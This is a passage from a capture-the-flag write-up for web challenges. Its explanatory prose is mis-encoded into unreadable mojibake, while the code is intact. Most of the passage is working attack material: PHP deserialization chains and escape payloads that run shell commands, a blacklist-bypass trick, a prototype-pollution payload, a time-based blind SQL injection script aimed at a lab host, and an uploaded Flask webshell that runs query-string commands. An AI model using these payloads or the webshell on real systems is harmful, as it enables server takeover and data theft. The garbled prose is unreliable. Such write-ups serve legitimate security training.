data-155='101' data-156='101' data-157='1' data-158='2' data-159='2' data-160='2' data-161='110' data-162='110' data-163='10' data-164='2' data-165='2' data-166='2' data-167='40' data-168='40' data-169='40' data-170='0' data-171='2' data-172='2' data-173='2' data-174='39' data-175='39' data-176='39' data-177='9' data-178='2' data-179='2' data-180='2' data-181='99' data-182='99' data-183='99' data-184='9' data-185='2' data-186='2' data-187='2' data-188='97' data-189='97' data-190='97' data-191='7' data-192='2' data-193='2' data-194='2' data-195='116' data-196='116' data-197='16' data-198='2' data-199='2' data-200='2' data-201='32' data-202='32' data-203='32' data-204='2' data-205='2' data-206='2' data-207='2' data-208='47' data-209='47' data-210='47' data-211='7' data-212='2' data-213='2' data-214='2' data-215='102' data-216='102' data-217='2' data-218='2' data-219='2' data-220='2' data-221='108' data-222='108' data-223='8' data-224='2' data-225='2' data-226='2' data-227='97' data-228='97' data-229='97' data-230='7' data-231='2' data-232='2' data-233='2' data-234='103' data-235='103' data-236='3' data-237='2' data-238='2' data-239='2' data-240='39' data-241='39' data-242='39' data-243='9' data-244='2' data-245='2' data-246='2' data-247='41' data-248='41' data-249='41' data-250='1' data-251='2' data-252='2' data-253='2' data-254='46' data-255='46' data-256='46' data-257='6' data-258='2' data-259='2' data-260='2' data-261='114' data-262='114' data-263='14' data-264='2' data-265='2' data-266='2' data-267='101' data-268='101' data-269='1' data-270='2' data-271='2' data-272='2' data-273='97' data-274='97' data-275='97' data-276='7' data-277='2' data-278='2' data-279='2' data-280='100' data-281='100' data-282='0' data-283='2' data-284='2' data-285='2' data-286='40' data-287='40' data-288='40' data-289='0' data-290='2' data-291='2' data-292='2' data-293='41' data-294='41' data-295='41' data-296='1'>&LT/div>
</span></code></pre><p>å³å¯å¾—åˆ° flagã€‚<h3 id=week-3-r-c-e>[Week 3]R!!!C!!!E!!!<a aria-label="Anchor link for: week-3-r-c-e" class=zola-anchor href=#week-3-r-c-e style=visibility:hidden></a></h3><p>æºä»£ç å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">class minipop{
</span><span class="z-text z-plain">    public $code;
</span><span class="z-text z-plain">    public $qwejaskdjnlka;
</span><span class="z-text z-plain">    public function __toString()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
</span><span class="z-text z-plain">            exec($this->code);
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">        return "alright";
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">    public function __destruct()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        echo $this->qwejaskdjnlka;
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">if(isset($_POST['payload'])){
</span><span class="z-text z-plain">    //wanna try?
</span><span class="z-text z-plain">    unserialize($_POST['payload']);
</span><span class="z-text z-plain">}
</span></code></pre><p>é€šè¿‡ exec æ–¹æ³•å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå› æ­¤è¿™é¢˜ä¹Ÿè€ƒçš„æ˜¯ Linux çš„å‘½ä»¤ç»•è¿‡ã€‚<p>ç”±äºå¼•å·æ²¡æœ‰è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¼•å·è¿›è¡Œå…³é”®å­—çš„ç»•è¿‡ï¼Œæ„é€  Payload è¿‡ç¨‹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">class minipop{
</span><span class="z-text z-plain">    public $code;
</span><span class="z-text z-plain">    public $qwejaskdjnlka;
</span><span class="z-text z-plain">    public function __toString()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
</span><span class="z-text z-plain">            exec($this->code);
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">        return "alright";
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">    public function __destruct()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        echo $this->qwejaskdjnlka;
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">if(isset($_POST['payload'])){
</span><span class="z-text z-plain">    //wanna try?
</span><span class="z-text z-plain">    unserialize($_POST['payload']);
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">$pop = new minipop();
</span><span class="z-text z-plain">$pop->qwejaskdjnlka = new minipop();
</span><span class="z-text z-plain">$pop->qwejaskdjnlka->code = "cat /flag_is_h3eeere | t''ee 2";
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">echo serialize($pop);
</span><span class="z-text z-plain">// O:7:"minipop":2:{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{s:4:"code";s:30:"cat /flag_is_h3eeere | t''ee 2";s:13:"qwejaskdjnlka";N;}}
</span></code></pre><p>å³å¯å¾—åˆ° flagã€‚<h3 id=week-3-otenkigirl>[Week 3]OtenkiGirl<a aria-label="Anchor link for: week-3-otenkigirl" class=zola-anchor href=#week-3-otenkigirl style=visibility:hidden></a></h3><p>æºä»£ç ä¸­å­˜åœ¨ <code>hint.txt</code> å†…å®¹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">ã€ã€Œroutesã€ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã ã‘ã‚’è¦‹ã¦ãã ã•ã„ã€‚SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã€ã¨å¾¡å‚å¾¡å‚ã¯æœŸå¾…ã«æº€ã¡ãŸæ°—æŒã¡ã§è¨€ã£ãŸã€‚
</span><span class="z-text z-plain">---
</span><span class="z-text z-plain">â€œè¯·åªçœ‹â€˜routesâ€™æ–‡ä»¶å¤¹ã€‚æ²¡æœ‰SQLæ³¨å…¥ã€‚â€å¾¡å‚å¾¡å‚æ»¡æ€€æœŸå¾…åœ°è¯´ã€‚
</span></code></pre><p>åœ¨ <code>routes/info.js</code> å¯ä»¥å‘ç°è¯¥è·¯ç”±ç”¨äºæ ¹æ®æ‰€ç»™çš„ timestamp è¾“å‡ºè¯¥æ—¶é—´æˆ³ä¹‹åçš„æ‰€æœ‰å†…å®¹ã€‚<pre class=z-code><code><span class="z-text z-plain">async function getInfo(timestamp) {
</span><span class="z-text z-plain">    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
</span><span class="z-text z-plain">    // Remove test data from before the movie was released
</span><span class="z-text z-plain">    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
</span><span class="z-text z-plain">    timestamp = Math.max(timestamp, minTimestamp);
</span><span class="z-text z-plain">    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
</span><span class="z-text z-plain">    return data;
</span><span class="z-text z-plain">}
</span></code></pre><p>åœ¨è¾“å…¥ timestamp åï¼Œä¸Šè¿°æ–¹æ³•ä¼šå°†æ‰€è¾“å…¥çš„ timestamp ä¸ min_public_time è¿›è¡Œå¯¹æ¯”ï¼Œå…¶ä¸­ <code>CONFIG.min_public_time</code> å€¼ä¸å­˜åœ¨ï¼Œ<code>DEFAULT_CONFIG.min_public_time</code> å€¼ä¸º <code>2019-07-09</code> ï¼Œå› æ­¤éœ€è¦é€šè¿‡æ±¡æŸ“ <code>min_public_time</code> å±æ€§æ‰èƒ½ä½¿å…¶è¾“å‡º 2019-07-09 ä¹‹å‰çš„æ•°æ®ã€‚<p>minTimestamp é¦–å…ˆä¼šä» <code>CONFIG</code> ä¸­è·å– <code>min_public_time</code> ï¼Œè·å–å¤±è´¥åç»§ç»­å†ä» <code>DEFAULT_CONFIG</code> ä¸­è·å–ï¼ŒäºŒè€…çš„åŸå‹å¯¹è±¡éƒ½æ˜¯ <code>Object</code> ã€‚<p>åœ¨ <code>routes/submit.js</code> ä¸­å¯ä»¥å‘ç°åŸå‹é“¾æ±¡æŸ“ç‚¹ï¼š<pre class=z-code><code><span class="z-text z-plain">// L39
</span><span class="z-text z-plain">const merge = (dst, src) => {
</span><span class="z-text z-plain">    if (typeof dst !== "object" || typeof src !== "object") return dst;
</span><span class="z-text z-plain">    for (let key in src) {
</span><span class="z-text z-plain">        if (key in dst && key in src) {
</span><span class="z-text z-plain">            dst[key] = merge(dst[key], src[key]);
</span><span class="z-text z-plain">        } else {
</span><span class="z-text z-plain">            dst[key] = src[key];
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">    return dst;
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">// L73
</span><span class="z-text z-plain">const DEFAULT = {
</span><span class="z-text z-plain">    date: "unknown",
</span><span class="z-text z-plain">    place: "unknown"
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">const result = await insert2db(merge(DEFAULT, data));
</span></code></pre><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ<code>data</code> çš„å€¼æ˜¯å¯æ§çš„ï¼Œèƒ½å¤Ÿé€šè¿‡ POST è¯·æ±‚ä¼ å…¥ã€‚<code>DEFAULT</code> çš„åŸå‹å¯¹è±¡ä¹Ÿæ˜¯ <code>Object</code> ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ submit è·¯ç”±æ¥è¿›è¡Œæ±¡æŸ“æ”»å‡»ã€‚<p>æ„é€  Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">{
</span><span class="z-text z-plain">    "contact":"a's'd",
</span><span class="z-text z-plain">    "reason":"a'd's",
</span><span class="z-text z-plain">    "__proto__": {
</span><span class="z-text z-plain">        "min_public_time":  "1970-01-01"
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span></code></pre><p>é€šè¿‡è®¿é—® <code>/info/0</code> å¯ä»¥å¾—åˆ°å›æ˜¾å¾—åˆ° flag ã€‚<pre class=z-code><code><span class="z-text z-plain">{
</span><span class="z-text z-plain">    status: "success",
</span><span class="z-text z-plain">    data: [
</span><span class="z-text z-plain">        ...,
</span><span class="z-text z-plain">        {
</span><span class="z-text z-plain">            wishid: "2TrumXdm9HTH9SZvgNPaHmAx",
</span><span class="z-text z-plain">            date: "2021-09-27",
</span><span class="z-text z-plain">            place: "å­¦åœ’éƒ½å¸‚",
</span><span class="z-text z-plain">            contact: "å¾¡å‚ç¾ç´",
</span><span class="z-text z-plain">            reason: "æµ·èƒ†ã®ã‚ˆã†ãªé¡”ã‚’ã—ãŸã‚ã„ã¤ãŒå¤§è¦‡æ˜Ÿç¥­ã§ç§ã«è² ã‘ãŸã€å½¼ã‚’é€£ã‚Œã¦å‡ºã‹ã‘ã‚‹ã¤ã‚‚ã‚Šã ã€‚å½¼ã‚’æºå¸¯åº—ã®ã‚«ãƒƒãƒ—ãƒ«ã®ã‚¤ãƒ™ãƒ³ãƒˆã«é€£ã‚Œã¦è¡ŒããŸã„ï¼ˆã‚¤ãƒ™ãƒ³ãƒˆã§ãƒ—ãƒ¬ã‚¼ãƒ³ãƒˆã•ã‚Œã‚‹ã‚²ã‚³å¤ªã¯è¶…ãƒ¬ã‚¢ã ï¼ï¼‰æ™´ã‚Œã®æ—¥ãŒå¿…è¦ã§ã€å½¼ã‚’å®Œå…¨ã«ã‚„ã£ã¤ã‘ã‚‹ï¼ã‚²ã‚³å¤ªã®æŠ½é¸ç•ªå·ã¯flag{c2c65ecd-d8d1-4b68-8003-5e608c0dc222}ã§ã™",
</span><span class="z-text z-plain">            timestamp: 1190726040836
</span><span class="z-text z-plain">        },
</span><span class="z-text z-plain">        ...
</span><span class="z-text z-plain">    ]
</span><span class="z-text z-plain">}
</span></code></pre><h3 id=week-4-tao>[Week 4]é€ƒ<a aria-label="Anchor link for: week-4-tao" class=zola-anchor href=#week-4-tao style=visibility:hidden></a></h3><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯ PHP ååºåˆ—åŒ–é€ƒé€¸ã€‚<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">function waf($str){
</span><span class="z-text z-plain">    return str_replace("bad","good",$str);
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class GetFlag {
</span><span class="z-text z-plain">    public $key;
</span><span class="z-text z-plain">    public $cmd = "whoami";
</span><span class="z-text z-plain">    public function __construct($key)
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        $this->key = $key;
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">    public function __destruct()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        system($this->cmd);
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">unserialize(waf(serialize(new GetFlag($_GET['key']))));
</span></code></pre><p>å¯æ§çš„å±æ€§ä¸º <code>key</code> ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ waf ä¸­çš„æ›¿æ¢æ¥å®ç°ååºåˆ—åŒ–é€ƒé€¸çš„æ•ˆæœã€‚<pre class=z-code><code><span class="z-text z-plain">$getFlag = new GetFlag('');
</span><span class="z-text z-plain">echo '&LTbr>'.serialize($getFlag).'&LTbr>';
</span><span class="z-text z-plain">echo waf(serialize($getFlag)).'&LTbr>';
</span><span class="z-text z-plain">// O:7:"GetFlag":2:{s:3:"key";s:0:"";s:3:"cmd";s:6:"whoami";}
</span><span class="z-text z-plain">// O:7:"GetFlag":2:{s:3:"key";s:0:"";s:3:"cmd";s:6:"whoami";}
</span></code></pre><p>éœ€è¦é€šè¿‡é€ƒé€¸æ„é€ å‡º <code>";s:3:"cmd";s:4:"ls /";}</code> å…± 24 ä¸ªå­—ç¬¦ï¼Œåˆå› ä¸º bad æ›¿æ¢æˆ good åå³å¢åŠ ä¸€ä½ï¼Œå› æ­¤éœ€è¦å¾ªç¯ 24 æ¬¡ bad æ¥è¿›è¡Œé€ƒé€¸ã€‚<pre class=z-code><code><span class="z-text z-plain">$getFlag = new GetFlag(str_repeat("bad", 24).'";s:3:"cmd";s:4:"ls /";}');
</span><span class="z-text z-plain">echo '&LTbr>'.serialize($getFlag).'&LTbr>';
</span><span class="z-text z-plain">echo waf(serialize($getFlag)).'&LTbr>';
</span><span class="z-text z-plain">// O:7:"GetFlag":2:{s:3:"key";s:96:"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}
</span><span class="z-text z-plain">// O:7:"GetFlag":2:{s:3:"key";s:96:"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}
</span></code></pre><p>æ„é€  Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}
</span></code></pre><p>å³å¯è¾“å‡ºè·Ÿç›®å½•çš„å†…å®¹ï¼ŒåŒç†æ„é€  Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
</span></code></pre><p>å³å¯å¾—åˆ° flagã€‚<h3 id=week-4-more-fast>[Week 4]More Fast<a aria-label="Anchor link for: week-4-more-fast" class=zola-anchor href=#week-4-more-fast style=visibility:hidden></a></h3><ul><li></ul><p>GC å›æ”¶<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Start{
</span><span class="z-text z-plain">    public $errMsg;
</span><span class="z-text z-plain">    public function __destruct() {
</span><span class="z-text z-plain">        die($this->errMsg);
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Pwn{
</span><span class="z-text z-plain">    public $obj;
</span><span class="z-text z-plain">    public function __invoke(){
</span><span class="z-text z-plain">        $this->obj->evil();
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">    public function evil() {
</span><span class="z-text z-plain">        phpinfo();
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Reverse{
</span><span class="z-text z-plain">    public $func;
</span><span class="z-text z-plain">    public function __get($var) {
</span><span class="z-text z-plain">        ($this->func)();
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Web{
</span><span class="z-text z-plain">    public $func;
</span><span class="z-text z-plain">    public $var;
</span><span class="z-text z-plain">    public function evil() {
</span><span class="z-text z-plain">        if(!preg_match("/flag/i",$this->var)){
</span><span class="z-text z-plain">            ($this->func)($this->var);
</span><span class="z-text z-plain">        }else{
</span><span class="z-text z-plain">            echo "Not Flag";
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Crypto{
</span><span class="z-text z-plain">    public $obj;
</span><span class="z-text z-plain">    public function __toString() {
</span><span class="z-text z-plain">        $wel = $this->obj->good;
</span><span class="z-text z-plain">        return "NewStar";
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Misc{
</span><span class="z-text z-plain">    public function evil() {
</span><span class="z-text z-plain">        echo "good job but nothing";
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">$a = @unserialize($_POST['fast']);
</span><span class="z-text z-plain">throw new Exception("Nope");
</span></code></pre><blockquote><p>åœ¨PHPä¸­ï¼Œä½¿ç”¨ <code>å¼•ç”¨è®¡æ•°</code> å’Œ <code>å›æ”¶å‘¨æœŸ</code> æ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡çš„ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸º <code>NULL</code> ï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘ æ—¶ï¼Œå®ƒå°±ä¼šè¢«å˜æˆåƒåœ¾ï¼Œè¢« <code>GC</code> æœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰ é‚£ä¹ˆè¿™é‡Œçš„è¯æˆ‘ä»¬å°±å¯ä»¥ç†è§£ä¸ºï¼Œå½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨æ—¶ï¼Œå°±ä¼šè¢« <code>GC</code> æœºåˆ¶å›æ”¶ï¼Œåœ¨å›æ”¶çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šè‡ªåŠ¨è§¦å‘ <code>_destruct</code> æ–¹æ³•ï¼Œè€Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»•è¿‡æŠ›å‡ºå¼‚å¸¸çš„å…³é”®ç‚¹ã€‚<p>https://xz.aliyun.com/t/11843</blockquote><p>å½“ Unserialize è¿è¡Œå¤±è´¥æ—¶ï¼Œåˆ™ä¼šå¯¹è¿è¡Œä¸­çš„å·²ç»åˆ›å»ºå‡ºæ¥çš„ç±»è¿›è¡Œé”€æ¯ï¼Œæå‰è§¦å‘ __destruct å‡½æ•°ã€‚<p>è§¦å‘ GC æœºåˆ¶çš„æ–¹æ³•ï¼š<ul><li></ul><p>å¯¹è±¡è¢« unset() å‡½æ•°å¤„ç†ï¼›<ul><li></ul><p>æ•°ç»„å¯¹è±¡ä¸º NULL ã€‚<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">show_source(__FILE__);
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class B {
</span><span class="z-text z-plain">  function __destruct() {
</span><span class="z-text z-plain">    global $flag;
</span><span class="z-text z-plain">    echo $flag;
</span><span class="z-text z-plain">  }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">$a=array(new B,0);
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">echo serialize($a);
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">// a:2:{i:0;O:1:"B":0:{}i:1;i:0;}
</span><span class="z-text z-plain">// æ•°ç»„:é•¿åº¦ä¸º2::{intå‹:é•¿åº¦0;ç±»:é•¿åº¦ä¸º1:ç±»åä¸º"B":å€¼ä¸º0 intå‹:å€¼ä¸º1ï¼šintå‹;å€¼ä¸º0
</span></code></pre><p>å°†ç¬¬äºŒä¸ªç´¢å¼•å€¼è®¾ä¸ºç©º ï¼Œå°±å¯ä»¥è§¦å‘ GC å›æ”¶æœºåˆ¶ã€‚<p>POP é“¾å¦‚ä¸‹ï¼š<pre class=z-code><code><span class="z-text z-plain">Start::__destruct()->Crypto::__toString()->Reverse::__get($var)->Pwn::__invoke()->Web::evil()
</span></code></pre><pre class=z-code><code><span class="z-text z-plain">$p = new Pwn();
</span><span class="z-text z-plain">$p->obj = new Web;
</span><span class="z-text z-plain">$p->obj->func = "system";
</span><span class="z-text z-plain">$p->obj->var = "ls /";
</span><span class="z-text z-plain">$r = new Reverse();
</span><span class="z-text z-plain">$r->func = $p;
</span><span class="z-text z-plain">$c = new Crypto();
</span><span class="z-text z-plain">$c->obj = $r;
</span><span class="z-text z-plain">$s = new Start();
</span><span class="z-text z-plain">$s->errMsg = $c;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">$a = array($s, 0);
</span><span class="z-text z-plain">echo serialize($a);
</span><span class="z-text z-plain">// a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:1;i:0;}
</span></code></pre><p>é€šè¿‡å°†ç¬¬äºŒä¸ªç´¢å¼• <code>i:1</code> ä¿®æ”¹ä¸º <code>i:0</code> å³å¯å‡ºå‘ GC å›æ”¶æœºåˆ¶ï¼Œæ„é€  Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:0;i:0;}
</span></code></pre><p>å³å¯å¾—åˆ°ç›®å½•ï¼Œå†æ„é€  Payload å¦‚ä¸‹å³å¯å¾—åˆ° flag ã€‚<pre class=z-code><code><span class="z-text z-plain">fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:0;i:0;}
</span></code></pre><h3 id=week-4-midsql>[Week 4]midsql<a aria-label="Anchor link for: week-4-midsql" class=zola-anchor href=#week-4-midsql style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">$cmd = "select name, price from items where id = ".$_REQUEST["id"];
</span><span class="z-text z-plain">$result = mysqli_fetch_all($result);
</span><span class="z-text z-plain">$result = $result[0];
</span></code></pre><p>ç»è¿‡å°è¯•æ— è®ºè¾“å…¥ä»€ä¹ˆæ­£ç¡®çš„éƒ½åªä¼šå›æ˜¾ <code>ä½ ä¸ä¼šä»¥ä¸ºæˆ‘çœŸçš„ä¼šå‘Šè¯‰ä½ ç»“æœå§</code> ï¼ŒçŒœæµ‹éœ€è¦è¿›è¡Œç›²æ³¨ï¼Œå…ˆé€šè¿‡æ„é€ ä¸åŒçš„ Payload åˆ¤æ–­å“ªäº›è¢«è¿›è¡Œäº†è¿‡æ»¤éœ€è¦è¿›è¡Œç»•è¿‡ã€‚<p>ç»è¿‡æµ‹è¯•ï¼Œç©ºæ ¼ã€ç­‰å·è¢«ç»•è¿‡äº†ï¼Œå¯ä»¥é€šè¿‡ <code>/**/</code> å’Œ <code>like</code> è¿›è¡Œç»•è¿‡ã€‚<pre class=z-code><code><span class="z-text z-plain">import time
</span><span class="z-text z-plain">import socket
</span><span class="z-text z-plain">import requests
</span><span class="z-text z-plain">import requests.packages.urllib3.util.connection as urllib3_conn
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">urllib3_conn.allowed_gai_family = lambda: socket.AF_INET
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">session = requests.Session()
</span><span class="z-text z-plain">def getDatabase():
</span><span class="z-text z-plain">    results = []
</span><span class="z-text z-plain">    for i in range(1, 1000):
</span><span class="z-text z-plain">        print(f'{i}...')
</span><span class="z-text z-plain">        start = -1 
</span><span class="z-text z-plain">        end = 255
</span><span class="z-text z-plain">        mid = -1
</span><span class="z-text z-plain">        while start < end:
</span><span class="z-text z-plain">            mid = (start + end) // 2
</span><span class="z-text z-plain">            url = "http://c968b372-387a-4e4b-b157-b99e627c3a66.node5.buuoj.cn:81/"
</span><span class="z-text z-plain">            params = {"id": f"1/**/and/**/if(ascii(substr(database(),{i},1))>{mid},sleep(1),1)#"}
</span><span class="z-text z-plain">            ret = session.get(url, params=params)
</span><span class="z-text z-plain">            assert ret.status_code == 200, f'code: {ret.status_code}'
</span><span class="z-text z-plain">            assert '429 Too Many Requests' not in ret.text
</span><span class="z-text z-plain">            if ret.elapsed.total_seconds() >= 1:
</span><span class="z-text z-plain">                start = mid + 1
</span><span class="z-text z-plain">            else:
</span><span class="z-text z-plain">                end = mid
</span><span class="z-text z-plain">            time.sleep(0.05)
</span><span class="z-text z-plain">        if mid == -1:
</span><span class="z-text z-plain">            break
</span><span class="z-text z-plain">        results.append(chr(start))
</span><span class="z-text z-plain">        print(''.join(results))
</span><span class="z-text z-plain">    return ''.join(results)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">begin = time.time()
</span><span class="z-text z-plain">getDatabase()
</span><span class="z-text z-plain">print(f'time spend: {time.time() - begin}')
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">"""
</span><span class="z-text z-plain">1...
</span><span class="z-text z-plain">c
</span><span class="z-text z-plain">2...
</span><span class="z-text z-plain">ct
</span><span class="z-text z-plain">3...
</span><span class="z-text z-plain">ctf
</span><span class="z-text z-plain">4...
</span><span class="z-text z-plain">time spend: 16.405414819717407
</span><span class="z-text z-plain">"""
</span></code></pre><p>å¯ä»¥å¾—å‡ºæ•°æ®åº“åä¸º <code>ctf</code> ã€‚<pre class=z-code><code><span class="z-text z-plain">params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'ctf'),{i},1))>{mid},sleep(1),1)#"}
</span></code></pre><p>å¯ä»¥å¾—å‡ºè¡¨åä¸º <code>items</code> ã€‚<pre class=z-code><code><span class="z-text z-plain">params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'ctf'/**/and/**/table_name/**/like'items'),{i},1))>{mid},sleep(1),1)#"}
</span></code></pre><p>å¯ä»¥å¾—å‡ºå­—æ®µåä¸º <code>id,name,price</code> ã€‚<pre class=z-code><code><span class="z-text z-plain">params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),{i},1))>{mid},sleep(1),1)#"}
</span></code></pre><p>å¯ä»¥å¾—å‡ºå€¼ <code>1lolita1000,520lolita's flag is flag{647190d8-7511-4386-b513-15440eb033be}1688</code> ã€‚<h3 id=week-4-flask-disk>[Week 4]Flask Disk<a aria-label="Anchor link for: week-4-flask-disk" class=zola-anchor href=#week-4-flask-disk style=visibility:hidden></a></h3><p>æ ¹æ®é¢˜ç›®å·²çŸ¥æ¡†æ¶ä¸º Flask ï¼Œé€šè¿‡ <code>admin manage</code> å·²çŸ¥å¼€å¯äº† Debug æ¨¡å¼ï¼Œåœ¨è¯¥æ¨¡å¼ä¸‹ä¿®æ”¹ <code>app.py</code> ä¼šç«‹å³åŠ è½½ï¼Œé€šè¿‡ Upload ä¸Šä¼ æ–°çš„ <code>app.py</code> ã€‚<pre class=z-code><code><span class="z-text z-plain">from flask import *
</span><span class="z-text z-plain">import os
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">app = Flask(__name__)
</span><span class="z-text z-plain">@app.route('/')
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def index():
</span><span class="z-text z-plain">    try:
</span><span class="z-text z-plain">        cmd = request.args.get('1')
</span><span class="z-text z-plain">        data = os.popen(cmd).read()
</span><span class="z-text z-plain">        return data
